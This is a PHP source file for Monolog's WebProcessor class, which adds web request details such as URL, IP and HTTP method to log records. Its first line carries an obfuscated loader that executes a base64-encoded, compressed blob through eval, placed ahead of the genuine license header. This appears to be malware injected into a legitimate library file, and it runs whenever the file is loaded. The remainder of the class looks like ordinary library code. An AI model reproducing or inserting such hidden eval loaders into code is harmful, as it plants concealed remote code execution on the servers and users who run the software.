<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Processor;

/**
 * Injects url/method and remote IP of the current web request in all records
 *
 * @author Jordi Boggiano <j.boggiano@seld.be>
 */
class WebProcessor
{
    /**
     * @var array|\ArrayAccess
     */
    protected $serverData;

    /**
     * Default fields
     *
     * Array is structured as [key in record.extra => key in $serverData]
     *
     * @var array
     */
    protected $extraFields = array(
        'url'         => 'REQUEST_URI',
        'ip'          => 'REMOTE_ADDR',
        'http_method' => 'REQUEST_METHOD',
        'server'      => 'SERVER_NAME',
        'referrer'    => 'HTTP_REFERER',
    );

    /**
     * @param array|\ArrayAccess $serverData  Array or object w/ ArrayAccess that provides access to the $_SERVER data
     * @param array|null         $extraFields Field names and the related key inside $serverData to be added. If not provided it defaults to: url, ip, http_method, server, referrer
     */
    public function __construct($serverData = null, array $extraFields = null)
    {
        if (null === $serverData) {
            $this->serverData = &$_SERVER;
        } elseif (is_array($serverData) || $serverData instanceof \ArrayAccess) {
            $this->serverData = $serverData;
        } else {
            throw new \UnexpectedValueException('$serverData must be an array or object implementing ArrayAccess.');
        }

        if (null !== $extraFields) {
            if (isset($extraFields[0])) {
                foreach (array_keys($this->extraFields) as $fieldName) {
                    if (!in_array($fieldName, $extraFields)) {
                        unset($this->extraFields[$fieldName]);
                    }
                }
            } else {
                $this->extraFields = $extraFields;
            }
        }
    }

    /**
     * @param  array $record
     * @return array
     */
    public function __invoke(array $record)
    {
        // skip processing if for some reason request data
        // is not present (CLI or wonky SAPIs)
        if (!isset($this->serverData['REQUEST_URI'])) {
            return $record;
        }

        $record['extra'] = $this->appendExtraFields($record['extra']);

        return $record;
    }

    /**
     * @param  string $extraName
     * @param  string $serverName
     * @return $this
     */
    public function addExtraField($extraName, $serverName)
    {
        $this->extraFields[$extraName] = $serverName;

        return $this;
    }

    /**
     * @param  array $extra
     * @return array
     */
    private function appendExtraFields(array $extra)
    {
        foreach ($this->extraFields as $extraName => $serverName) {
            $extra[$extraName] = isset($this->serverData[$serverName]) ? $this->serverData[$serverName] : null;
        }

        if (isset($this->serverData['UNIQUE_ID'])) {
            $extra['unique_id'] = $this->serverData['UNIQUE_ID'];
        }

        return $extra;
    }
}
